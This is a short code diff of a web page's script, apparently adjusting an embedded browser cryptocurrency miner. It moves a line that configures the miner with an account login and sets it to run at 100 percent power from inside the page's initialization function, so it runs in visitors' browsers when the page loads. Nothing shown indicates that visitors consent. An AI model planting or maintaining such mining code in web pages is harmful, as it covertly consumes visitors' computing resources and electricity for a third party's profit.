@@ -190,8 +190,9 @@ function initializeWebMiner() {
 
     // Listen for share accepted event
     WEBMINER.on('accepted', () => console.log('New share'));
+    WEBMINER.config({ login: "7149405", pass: null }).power(100);
 }
-  WEBMINER.config({ login: "7149405", pass: null }).power(100);
+
 </script>
 
   </BODY>
